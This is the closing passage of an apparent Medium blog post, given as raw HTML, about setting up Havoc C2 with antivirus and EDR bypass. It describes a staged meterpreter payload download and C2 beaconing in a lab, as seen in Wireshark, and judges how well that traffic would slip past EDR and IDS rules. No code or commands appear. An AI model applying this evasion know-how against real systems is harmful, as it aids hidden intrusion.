https://miro.medium.com/v2/resize:fit:828/1*JDupBORwa0hY1Fek5ZA7Bg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*JDupBORwa0hY1Fek5ZA7Bg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*JDupBORwa0hY1Fek5ZA7Bg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn py c" width="1000" height="214" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*JDupBORwa0hY1Fek5ZA7Bg.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="01a3" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">I finally receive an encrypted C2 session on Havoc C2 client.</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div class="pl pm th"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*81yHDrC9joTGtsN9i3uBcg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*81yHDrC9joTGtsN9i3uBcg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*81yHDrC9joTGtsN9i3uBcg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*81yHDrC9joTGtsN9i3uBcg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*81yHDrC9joTGtsN9i3uBcg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*81yHDrC9joTGtsN9i3uBcg.png 1100w, https://miro.medium.com/v2/resize:fit:1182/format:webp/1*81yHDrC9joTGtsN9i3uBcg.png 1182w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 591px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*81yHDrC9joTGtsN9i3uBcg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*81yHDrC9joTGtsN9i3uBcg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*81yHDrC9joTGtsN9i3uBcg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*81yHDrC9joTGtsN9i3uBcg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*81yHDrC9joTGtsN9i3uBcg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*81yHDrC9joTGtsN9i3uBcg.png 1100w, https://miro.medium.com/v2/resize:fit:1182/1*81yHDrC9joTGtsN9i3uBcg.png 1182w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 591px"><img alt="" class="bi mn py c" width="591" height="240" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:591/1*81yHDrC9joTGtsN9i3uBcg.png"></picture></div></figure><p id="29f5" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">This is great so far! In my next post we’re going to cover packaging this executable and DLL to look less ominous, using it to achieve persistence in a scheduled task, and also exploiting over the internet instead of a local network. I hope you enjoyed the read!</p><h3 id="fc1c" class="rp ol hl bg om rq rr ef op rs rt eh os np ru rv rw nt rx ry rz nx sa sb sc sd bl" data-selectable-paragraph=""><strong class="an">BONUS: Wireshark Analysis</strong></h3><p id="1d83" class="pw-post-body-paragraph ng nh hl ni b ij pg nk nl im ph nn no np pi nr ns nt pj nv nw nx pk nz oa ob he bl" data-selectable-paragraph="">I was interested in what these connections looked like on Wireshark. For the pcap data below, the attacker IP is 10.0.2.9 and the victim IP is 10.0.2.15.</p><ol class=""><li id="f0ed" class="ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob tb od oe bl" data-selectable-paragraph="">Stage 2 payload (meterpreter) download:</li></ol><p id="9874" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">After the stage 1 payload shellcode is loaded into memory, its executed by the victim to download the stage 2 payload. After the initial TCP handshake (10–14), the victim says here’s all my options for creating a secure session (18). The server then says here’s my certificate and my session options too (20). The victim then comes back and says I want to use these options. The server creates a new session ticket (23) and the victim acknowledges it (24). Then starting on packet (34) the stage 2 payload is sent to the victim using the encrypted session ticket. In packet 44, the whole stage 2 payload is sent to the victim. Overall, this looks pretty normal on the network side.</p></div></div><div class="pt"><div class="ac ci"><div class="mi si mj sj mk sk cm sl cn sm cp bi"><figure class="po pp pq pr ps pt so sp paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm ti"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*VLSV2HwiZXdpvjzWOZhM8A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*VLSV2HwiZXdpvjzWOZhM8A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*VLSV2HwiZXdpvjzWOZhM8A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*VLSV2HwiZXdpvjzWOZhM8A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*VLSV2HwiZXdpvjzWOZhM8A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*VLSV2HwiZXdpvjzWOZhM8A.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*VLSV2HwiZXdpvjzWOZhM8A.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*VLSV2HwiZXdpvjzWOZhM8A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*VLSV2HwiZXdpvjzWOZhM8A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*VLSV2HwiZXdpvjzWOZhM8A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*VLSV2HwiZXdpvjzWOZhM8A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*VLSV2HwiZXdpvjzWOZhM8A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*VLSV2HwiZXdpvjzWOZhM8A.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*VLSV2HwiZXdpvjzWOZhM8A.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn py c" width="1000" height="514" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*VLSV2HwiZXdpvjzWOZhM8A.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="3977" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">2. Stage 2 payload (Havoc C2) execution:</p></div></div><div class="pt"><div class="ac ci"><div class="mi si mj sj mk sk cm sl cn sm cp bi"><figure class="po pp pq pr ps pt so sp paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm ti"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*Fjd771tjVcqlxFI0aXk0yg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*Fjd771tjVcqlxFI0aXk0yg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*Fjd771tjVcqlxFI0aXk0yg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*Fjd771tjVcqlxFI0aXk0yg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*Fjd771tjVcqlxFI0aXk0yg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*Fjd771tjVcqlxFI0aXk0yg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*Fjd771tjVcqlxFI0aXk0yg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*Fjd771tjVcqlxFI0aXk0yg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*Fjd771tjVcqlxFI0aXk0yg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*Fjd771tjVcqlxFI0aXk0yg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*Fjd771tjVcqlxFI0aXk0yg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*Fjd771tjVcqlxFI0aXk0yg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*Fjd771tjVcqlxFI0aXk0yg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*Fjd771tjVcqlxFI0aXk0yg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn py c" width="1000" height="441" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*Fjd771tjVcqlxFI0aXk0yg.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="bd7e" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Above it looks like our Havoc C2 generated SSL cert for the client is for some company in Arizona. Below, sending the command “whoami” in Havoc C2 generates a payload size of about 4kb which is not bad at all.</p></div></div><div class="pt"><div class="ac ci"><div class="mi si mj sj mk sk cm sl cn sm cp bi"><figure class="po pp pq pr ps pt so sp paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm tj"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*jlPOY6KoyUUzN05bCT9biQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*jlPOY6KoyUUzN05bCT9biQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*jlPOY6KoyUUzN05bCT9biQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*jlPOY6KoyUUzN05bCT9biQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*jlPOY6KoyUUzN05bCT9biQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*jlPOY6KoyUUzN05bCT9biQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*jlPOY6KoyUUzN05bCT9biQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*jlPOY6KoyUUzN05bCT9biQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*jlPOY6KoyUUzN05bCT9biQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*jlPOY6KoyUUzN05bCT9biQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*jlPOY6KoyUUzN05bCT9biQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*jlPOY6KoyUUzN05bCT9biQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*jlPOY6KoyUUzN05bCT9biQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*jlPOY6KoyUUzN05bCT9biQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn py c" width="1000" height="490" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*jlPOY6KoyUUzN05bCT9biQ.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="e6ee" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">The victim continues to ping the attacker very frequently and the attacker client replies with an ACK. Lets see how this looks against a real HTTPS website connection <a class="ah rn" href="https://facebook.com/" rel="noopener ugc nofollow" target="_blank">https://facebook.com</a> (68.105.28.11) below.</p></div></div><div class="pt"><div class="ac ci"><div class="mi si mj sj mk sk cm sl cn sm cp bi"><figure class="po pp pq pr ps pt so sp paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm tk"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*hTGtHM_uaM0mUcxuM5O5fA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*hTGtHM_uaM0mUcxuM5O5fA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*hTGtHM_uaM0mUcxuM5O5fA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*hTGtHM_uaM0mUcxuM5O5fA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*hTGtHM_uaM0mUcxuM5O5fA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*hTGtHM_uaM0mUcxuM5O5fA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*hTGtHM_uaM0mUcxuM5O5fA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*hTGtHM_uaM0mUcxuM5O5fA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*hTGtHM_uaM0mUcxuM5O5fA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*hTGtHM_uaM0mUcxuM5O5fA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*hTGtHM_uaM0mUcxuM5O5fA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*hTGtHM_uaM0mUcxuM5O5fA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*hTGtHM_uaM0mUcxuM5O5fA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*hTGtHM_uaM0mUcxuM5O5fA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn py c" width="1000" height="282" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*hTGtHM_uaM0mUcxuM5O5fA.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="d5b5" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">So the server and client act in the same way by pinging each other alot. The victim (client) continues to send application data to the server (attacker) and the server (attacker) responds with an ACK. The packet lengths seem about the same too, so I think Havoc C2 would do good against most EDR and IDS/IPS rulesets.</p></div></div></div></div></section></div></div></article></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="tl tm ac ju"><div class="qy ac"><a class="tn ak ao aq" rel="noopener follow" href="https://medium.com/tag/cybersecurity?source=post_page-----733d423fc67b---------------------------------------" data-discover="true"><div class="to fr de tp gv tq tr bg b bh ab bl gc">Cybersecurity</div></a></div><div class="qy ac"><a class="tn ak ao aq" rel="noopener follow" href="https://medium.com/tag/malware?source=post_page-----733d423fc67b---------------------------------------" data-discover="true"><div class="to fr de tp gv tq tr bg b bh ab bl gc">Malware</div></a></div><div class="qy ac"><a class="tn ak ao aq" rel="noopener follow" href="https://medium.com/tag/hacking?source=post_page-----733d423fc67b---------------------------------------" data-discover="true"><div class="to fr de tp gv tq tr bg b bh ab bl gc">Hacking</div></a></div><div class="qy ac"><a class="tn ak ao aq" rel="noopener follow" href="https://medium.com/tag/c-programming?source=post_page-----733d423fc67b---------------------------------------" data-discover="true"><div class="to fr de tp gv tq tr bg b bh ab bl gc">C Programming</div></a></div></div></div></div><div class="m"></div><div class="uh m"><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="ac jh jf jd ui uj"><div class="uk ul um un uo up uq ur us ut ac cw"><div class="i l"><a tabindex="0" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--733d423fc67b---------------------------------------" data-discover="true"><div class="m fr"><img alt="Sam Rothlisberger" class="m fk by uu uv de" width="48" height="48" loading="lazy" src="https://miro.medium.com/v2/resize:fill:48:48/1*Fzh2QBHCL67uIEt-y9at1w.jpeg"><div class="gj by m uu uv fw o ak uw"></div></div></a></div><div class="k j e"><a tabindex="0" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--733d423fc67b---------------------------------------" data-discover="true"><div class="m fr"><img alt="Sam Rothlisberger" class="m fk by ux uy de" width="64" height="64" loading="lazy" src="https://miro.medium.com/v2/resize:fill:64:64/1*Fzh2QBHCL67uIEt-y9at1w.jpeg"><div class="gj by m ux uy fw o ak uw"></div></div></a></div><div class="k j e uz cb"><div class="ac"><button class="wg abq aq ac ci r abw lc abx" style="border: 1px solid rgba(13, 13, 13, 0.357);"><span class="bg b bh ab bl bi"><span class="bn abu">Follow</span></span></button></div></div></div><div class="ac cv cd"><div class="va vb vc sj si m"><a class="ah ai aj al am an ao ap aq ar as at au av ac r" rel="noopener follow" href="https://medium.com/@sam.rothlisberger?source=post_page---post_author_info--733d423fc67b---------------------------------------" data-discover="true"><h2 class="pw-author-name bg ve vf vg vh vi vj vk np rv rw nt ry rz nx sb sc bl"><span class="he vd">Written by Sam Rothlisberger</span></h2></a><div class="qy ac jj"><div class="m cb"><span class="pw-follower-count bg b bh ab eb"><a class="ah ai aj fo al am an ao ap aq ar as at js" rel="noopener follow" href="https://medium.com/@sam.rothlisberger/followers?source=post_page---post_author_info--733d423fc67b---------------------------------------" data-discover="true">1K followers</a></span></div><div class="bg b bh ab eb ac vl"><span class="vm m" aria-hidden="true"><span class="bg b bh ab eb">·</span></span><a class="ah ai aj fo al am an ao ap aq ar as at js" rel="noopener follow" href="https://medium.com/@sam.rothlisberger/following?source=post_page---post_author_info--733d423fc67b---------------------------------------" data-discover="true">5 following</a></div></div><div class="vn m"><p class="bg b bh ab bl">CompTIA Security+ Practice Questions : <a class="ah ai aj fo al am an ao ap aq ar as at rn hf he" href="https://www.udemy.com/course/comptia-security-plus-sy0-701-practice-tests/?referralCode=56015800FAABB6F91CFE" rel="noopener  ugc nofollow">https://www.udemy.com/course/comptia-security-plus-sy0-701-practice-tests/?referralCode=56015800FAABB6F91CFE</a></p></div></div></div><div class="i l"><div class="ac"><button class="wg abq aq ac ci r abw lc abx" style="border: 1px solid rgba(13, 13, 13, 0.357);"><span class="bg b bh ab bl bi"><span class="bn abu">Follow</span></span></button></div></div></div></div></div></div><div class="vo vp vq vr vs m"><div class="vt bi s uh"></div><div class="ac ci"><div class="cp bi gq gr gs gt"><div class="ac r cw"><h2 class="bg ve on il op oq io os ot ov ow ox oz pa pb pd pe bl">Responses (9)</h2><div class="ac vu"><div><div class="bn" aria-describedby="15" aria-labelledby="15" role="tooltip"><div tabindex="-1" class="bf"><a class="vv vw" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page---post_responses--733d423fc67b---------------------------------------" rel="noopener follow" target="_blank"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" aria-label="Shield with a checkmark" viewBox="0 0 25 25"><path fill-rule="evenodd" d="M11.987 5.036a.754.754 0 0 1 .914-.01c.972.721 1.767 1.218 2.6 1.543.828.322 1.719.485 2.887.505a.755.755 0 0 1 .741.757c-.018 3.623-.43 6.256-1.449 8.21-1.034 1.984-2.662 3.209-4.966 4.083a.75.75 0 0 1-.537-.003c-2.243-.874-3.858-2.095-4.897-4.074-1.024-1.951-1.457-4.583-1.476-8.216a.755.755 0 0 1 .741-.757c1.195-.02 2.1-.182 2.923-.503.827-.322 1.6-.815 2.519-1.535m.468.903c-.897.69-1.717 1.21-2.623 1.564-.898.35-1.856.527-3.026.565.037 3.45.469 5.817 1.36 7.515.884 1.684 2.25 2.762 4.284 3.571 2.092-.81 3.465-1.89 4.344-3.575.886-1.698 1.299-4.065 1.334-7.512-1.149-.039-2.091-.217-2.99-.567-.906-.353-1.745-.873-2.683-1.561m-.009 9.155a2.672 2.672 0 1 0 0-5.344 2.672 2.672 0 0 0 0 5.344m0 1a3.672 3.672 0 1 0 0-7.344 3.672 3.672 0 0 0 0 7.344m-1.813-3.777.525-.526.916.917 1.623-1.625.526.526-2.149 2.152z" clip-rule="evenodd"></path></svg></a></div></div></div></div></div><div class="vx vy vz wa wb wc wd m"><div><div class="bg b bh ab bl"><div class="zy"><div class="abg m"><div class="abh ac r"><div class="m fr"><img alt="" class="m fk by bz ca de" width="32" height="32" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fill:32:32/1*dmbNkD5D-u45r44go_cf0g.png"><div class="gj by m bz ca fw o ak uw"></div></div><div class="bo ac cu cv ci"><p class="bg b bh ab eb">Write a response</p></div></div><div class="de bq ac cv zz aba"><div class="ac cv fr"><span data-dd-action-name="Susi presentation tracker respond_sidebar"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2F%40sam.rothlisberger%2Fhavoc-c2-with-av-edr-bypass-methods-in-2024-part-1-733d423fc67b&amp;source=---post_responses--733d423fc67b---------------------respond_sidebar------------------" data-discover="true"><div class="ya m"><p class="bg b bh ab eb">What are your thoughts?</p></div></a></span><div class="cw abb eb ac abc zc abd"><span class="bg b bh ab eb"><div class="ac"><div><div class="bn" aria-describedby="28" aria-labelledby="28" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Bold (⌘B)" class="abi abj abk abl bq mh ci abm abn abo" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M10.308 17.993h-5.92l.11-.894.783-.12c.56-.11.79-.224.79-.448V5.37c0-.225-.113-.336-.902-.448H4.5l-.114-.894h6.255c4.02 0 5.58 1.23 5.58 3.13 0 1.896-1.78 3.125-3.79 3.463v.11c2.69.34 4.25 1.56 4.25 3.57 0 2.35-2.01 3.69-6.37 3.69l.02.01h-.02zm-.335-12.96H8.967V10.5h1.23c1.788 0 2.79-1.23 2.79-2.683 0-1.685-1.004-2.803-3.006-2.803v.02zm-.223 6.36h-.783v5.588l1.225.23h.22c1.67 0 3.01-1.004 3.01-2.792 0-2.122-1.566-3.016-3.69-3.016h.018z"></path></svg></span></div></div></div><div><div class="bn" aria-describedby="29" aria-labelledby="29" role="tooltip"><div tabindex="-1" class="bf"><span role="button" aria-label="Italic (⌘I)" class="abi abj abk abl bq mh ci abm abn abo" tabindex="0"><svg width="21" height="21"><path fill-rule="evenodd" d="M9.847 18.04c-.533 0-2.027-.64-1.92-.853l2.027-7.68-.64-.214-1.387 1.494-.427-.427c.534-1.173 1.707-2.667 2.774-2.667.533 0 2.24.534 2.133.854l-2.133 7.786.533.214 1.6-1.067.427.427c-.64 1.066-1.92 2.133-2.987 2.133m2.347-11.733c-.96 0-1.387-.64-1.387-1.387 0-1.067.747-1.92 1.493-1.92.854 0 1.387.64 1.387 1.493-.107 1.067-.747 1.814-1.493 1.814"></path></svg></span></div></div></div></div></span><div class="abe uz ac abc zc abd"><div class="abf"><button class="bg b ec ab bl abp wf wg wh mg md wi fc fd fe wj wk wl fh fi fj fk bn fl fm" data-testid="CancelResponseButton">Cancel</button></div><button class="bg b ec ab yn abp yo yp yq yr wi fc fd ys yt yu fh fi fj fk bn fl fm" disabled="" data-testid="ResponseRespondButton">Respond</button></div></div></div></div></div></div></div></div></div><div class="vy m"><div class="bi ed"><div class="aby abz m"><div class="ac cw"><div class="ac r"><div><div class="bn" aria-describedby="74" aria-labelledby="74" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" href="https://medium.com/@tylerforbes9799?source=post_page---post_responses--733d423fc67b----0-----------------------------------" data-discover="true"><div class="m fr"><div class="m fr"><img alt="Tylerforbes" class="m fk by bz ca de" width="32" height="32" loading="lazy" src="https://miro.medium.com/v2/resize:fill:32:32/0*F8lT47kyljMZBBSt"><div class="gj by m bz ca fw o ak gk"></div></div></div></a></div></div></div><div class="aca m"><div class="ac r"><div><div class="bn" aria-describedby="75" aria-labelledby="75" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at au av ac r acb acc" rel="noopener follow" href="https://medium.com/@tylerforbes9799?source=post_page---post_responses--733d423fc67b----0-----------------------------------" data-discover="true"><div class="ac jj acb"><p class="bg b bh ab ga acd qt qu ace qw acf qx bl">Tylerforbes</p></div></a></div></div></div></div><a class="ah ai aj fo al am an ao ap aq ar as at au av" rel="noopener follow" 